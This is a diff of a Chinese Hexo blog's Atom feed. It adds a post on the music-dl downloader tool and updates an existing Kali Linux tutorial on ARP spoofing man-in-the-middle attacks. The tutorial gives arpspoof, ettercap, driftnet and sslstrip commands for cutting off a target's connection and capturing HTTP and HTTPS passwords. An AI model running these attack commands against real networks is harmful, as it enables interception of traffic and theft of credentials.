@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://gz1903.github.io/"/>
-  <updated>2019-10-18T08:00:38.849Z</updated>
+  <updated>2019-10-18T12:19:43.779Z</updated>
   <id>https://gz1903.github.io/</id>
   
   <author>
@@ -15,6 +15,40 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Kali爬取全网音乐</title>
+    <link href="https://gz1903.github.io/2019/10/18/Kali%E7%88%AC%E5%8F%96%E5%85%A8%E7%BD%91%E9%9F%B3%E4%B9%90/"/>
+    <id>https://gz1903.github.io/2019/10/18/Kali爬取全网音乐/</id>
+    <published>2019-10-18T12:15:53.000Z</published>
+    <updated>2019-10-18T12:19:43.779Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>Music-dl 是一个基于Python3的命令行工具，可以从多个网站搜索和下载音乐，方便寻找音乐，解决不知道哪个网站有版权的问题。</strong></p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>部分歌曲支持无损音乐</li><li>优先搜索高品质音乐（无损 -&gt; 320K -&gt; 128K）</li><li>支持 HTTP 和 SOCKS 代理</li><li>支持多线程搜索</li><li>支持搜索结果去重和排序</li><li>支持搜索关键字高亮</li><li>支持下载歌词和封面（部分）</li></ul><blockquote><p>注意：仅支持Python3，建议使用 <strong>Python3.5 以上版本</strong></p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用pip安装（推荐，注意前面有一个<code>py</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pymusic-dl</span><br></pre></td></tr></table></figure><p>手动安装（最新）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/0xHJK/music-dl.git</span><br><span class="line"><span class="built_in">cd</span> music-dl</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p>不安装直接运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0xHJK/music-dl.git</span><br><span class="line">cd music-dl</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">./music-dl</span><br><span class="line"># 或 python3 music-dl</span><br></pre></td></tr></table></figure><blockquote><p>centos用此方法</p></blockquote><p>在以下环境测试通过：</p><table><thead><tr><th>系统名称</th><th>系统版本</th><th>Python版本</th></tr></thead><tbody><tr><td>macOS</td><td>10.14</td><td>3.7.0</td></tr><tr><td>macOS</td><td>10.13</td><td>3.7.0</td></tr><tr><td>Windows</td><td>Windows 7 x64</td><td>3.7.2</td></tr><tr><td>Windows</td><td>Windows 10 x64</td><td>3.7.2</td></tr><tr><td>Ubuntu</td><td>16.04 x64</td><td>3.5.2</td></tr></tbody></table><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>v3.0预览版命令有较大的改变，建议先查看帮助</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ music-dl --help</span><br><span class="line">Usage: music-dl [OPTIONS]</span><br><span class="line"></span><br><span class="line">  Search and download music from netease, qq, kugou, baidu and xiami.</span><br><span class="line">  Example: music-dl -k &quot;周杰伦&quot;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             Show the version and exit.</span><br><span class="line">  -k, --keyword TEXT    搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树）</span><br><span class="line">  -u, --url TEXT        通过指定的歌曲URL下载音乐</span><br><span class="line">  -p, --playlist TEXT   通过指定的歌单URL下载音乐</span><br><span class="line">  -s, --source TEXT     Supported music source: qq netease kugou baidu</span><br><span class="line">  -n, --number INTEGER  Number of search results</span><br><span class="line">  -o, --outdir TEXT     Output directory</span><br><span class="line">  -x, --proxy TEXT      Proxy (e.g. http://127.0.0.1:1087)</span><br><span class="line">  -v, --verbose         Verbose mode</span><br><span class="line">  --lyrics              同时下载歌词</span><br><span class="line">  --cover               同时下载封面</span><br><span class="line">  --nomerge             不对搜索结果列表排序和去重</span><br><span class="line">  --help                Show this message and exit.</span><br></pre></td></tr></table></figure><ul><li>默认搜索<code>qq netease kugou baidu</code>，每个数量限制为5，保存目录为当前目录。</li><li>指定序号时可以使用<code>1-5 7 10</code>的形式。</li><li>默认对搜索结果排序和去重，排序顺序按照歌手和歌名排序，当两者都相同时保留最大的文件。</li><li>无损音乐歌曲数量较少，如果没有无损会显示320K或128K。</li><li>支持http代理和socks代理，格式形如<code>-x http://127.0.0.1:1087</code>或<code>-x socks5://127.0.0.1:1086</code></li></ul><p>示例：</p><p><img alt data-src="https://ae01.alicdn.com/kf/Hd79778c55c844466871082bab9a80f0cf.png" class="lozad"></p><h2 id="支持的音乐源列表"><a href="#支持的音乐源列表" class="headerlink" title="支持的音乐源列表"></a>支持的音乐源列表</h2><table><thead><tr><th>音乐源</th><th>缩写</th><th>网址</th><th>有效</th><th>无损</th><th>320K</th><th>封面</th><th>歌词</th><th>歌单</th><th>单曲</th></tr></thead><tbody><tr><td>QQ音乐</td><td>qq</td><td><a href="https://y.qq.com/" target="_blank" rel="noopener">https://y.qq.com/</a></td><td>✓</td><td>-</td><td>-</td><td>✕</td><td>✓</td><td>✕</td><td>✕</td></tr><tr><td>酷狗音乐</td><td>kugou</td><td><a href="http://www.kugou.com/" target="_blank" rel="noopener">http://www.kugou.com/</a></td><td>✓</td><td>-</td><td>-</td><td>-</td><td>✕</td><td>✕</td><td>✕</td></tr><tr><td>网易云音乐</td><td>netease</td><td><a href="https://music.163.com/" target="_blank" rel="noopener">https://music.163.com/</a></td><td>✓</td><td>-</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td>咪咕音乐</td><td>migu</td><td><a href="http://www.migu.cn/" target="_blank" rel="noopener">http://www.migu.cn/</a></td><td>✓</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td><td>✕</td><td>✕</td></tr><tr><td>百度音乐</td><td>baidu</td><td><a href="http://music.baidu.com/" target="_blank" rel="noopener">http://music.baidu.com/</a></td><td>✓</td><td>-</td><td>✓</td><td>✓</td><td>✓</td><td>✕</td><td>✕</td></tr><tr><td>虾米音乐</td><td>xiami</td><td><a href="https://www.xiami.com/" target="_blank" rel="noopener">https://www.xiami.com/</a></td><td>✕</td><td>-</td><td>-</td><td>-</td><td>-</td><td>✕</td><td>✕</td></tr></tbody></table><blockquote><p><code>-</code>表示不一定支持，<code>✓</code>表示部分或完全支持，<code>✕</code>表示尚未支持</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
+      
+    
+    </summary>
+    
+    
+      <category term="Kali" scheme="https://gz1903.github.io/categories/Kali/"/>
+    
+      <category term="python" scheme="https://gz1903.github.io/categories/Kali/python/"/>
+    
+      <category term="music" scheme="https://gz1903.github.io/categories/Kali/python/music/"/>
+    
+    
+      <category term="Kali" scheme="https://gz1903.github.io/tags/Kali/"/>
+    
+      <category term="python" scheme="https://gz1903.github.io/tags/python/"/>
+    
+      <category term="music" scheme="https://gz1903.github.io/tags/music/"/>
+    
+  </entry>
   
   <entry>
     <title>Valine Admin</title>
@@ -149,7 +183,7 @@
     <link href="https://gz1903.github.io/2019/10/13/kali-linux-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
     <id>https://gz1903.github.io/2019/10/13/kali-linux-中间人攻击/</id>
     <published>2019-10-13T06:15:38.000Z</published>
-    <updated>2019-10-14T06:33:06.214Z</updated>
+    <updated>2019-10-18T12:17:23.979Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><h3 id="ARP攻击的局限性"><a href="#ARP攻击的局限性" class="headerlink" title="ARP攻击的局限性"></a>ARP攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。 </p><p>无法对外网（互联网、非本区域内的局域网）进行攻击。</p><h3 id="ARP攻击的攻击原理"><a href="#ARP攻击的攻击原理" class="headerlink" title="ARP攻击的攻击原理"></a>ARP攻击的攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="环境：kali-linux"><a href="#环境：kali-linux" class="headerlink" title="环境：kali-linux"></a>环境：kali-linux</h3><h3 id="工具：arpspoof"><a href="#工具：arpspoof" class="headerlink" title="工具：arpspoof"></a>工具：arpspoof</h3><h4 id="获取自己的网卡，IP，网关信息。"><a href="#获取自己的网卡，IP，网关信息。" class="headerlink" title="获取自己的网卡，IP，网关信息。"></a>获取自己的网卡，IP，网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ff3b00005cae4290e2ca" class="lozad"></p><h4 id="获取目标ip与网关信息。"><a href="#获取目标ip与网关信息。" class="headerlink" title="获取目标ip与网关信息。"></a>获取目标ip与网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.3.138.1/24</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ffe2000076a7ddfa9f0f" class="lozad"></p><h2 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.8.100 192.168.8.8</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/10001000021821e51122f" class="lozad"></p><blockquote><p>攻击完成，此时被攻击手机无法上网。（ctrl+Z）（ctrl+C）可停止攻击</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ff3800005a18018f4849" class="lozad"></p><h2 id="数据抓取"><a href="#数据抓取" class="headerlink" title="数据抓取"></a>数据抓取</h2><blockquote><p>首先要开始IP转发功能，linux因为系统安全考虑，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，接下来修改为1。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>修改完成后不显示，但可以用 <code>cat /proc/sys/net/ipv4/ip_forward</code>来确实是否修改成功。</p><p><img alt data-src="https://p.pstatp.com/origin/ffe6000090cded42ce48" class="lozad"></p><h4 id="抓取使用http协议的网页的图片"><a href="#抓取使用http协议的网页的图片" class="headerlink" title="抓取使用http协议的网页的图片"></a>抓取使用http协议的网页的图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure><blockquote><p>弹出对话框！！</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fe3c0000c4a5a55f4852" class="lozad"></p><h4 id="http账户密码获取"><a href="#http账户密码获取" class="headerlink" title="http账户密码获取"></a>http账户密码获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tp -i eth0</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe630000d607f86aa21c" class="lozad"></p><h4 id="https账户密码获取"><a href="#https账户密码获取" class="headerlink" title="https账户密码获取"></a>https账户密码获取</h4><blockquote><p>使https链接还原为http s </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k sslstrip</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -163,16 +197,16 @@
     </summary>
     
     
-      <category term="kali" scheme="https://gz1903.github.io/categories/kali/"/>
+      <category term="Kali" scheme="https://gz1903.github.io/categories/Kali/"/>
     
-      <category term="渗透" scheme="https://gz1903.github.io/categories/kali/%E6%B8%97%E9%80%8F/"/>
+      <category term="渗透" scheme="https://gz1903.github.io/categories/Kali/%E6%B8%97%E9%80%8F/"/>
     
-      <category term="Linux" scheme="https://gz1903.github.io/categories/kali/%E6%B8%97%E9%80%8F/Linux/"/>
+      <category term="Linux" scheme="https://gz1903.github.io/categories/Kali/%E6%B8%97%E9%80%8F/Linux/"/>
     
+    
+      <category term="Kali" scheme="https://gz1903.github.io/tags/Kali/"/>
     
       <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
-    
-      <category term="kali" scheme="https://gz1903.github.io/tags/kali/"/>
     
       <category term="渗透" scheme="https://gz1903.github.io/tags/%E6%B8%97%E9%80%8F/"/>
     
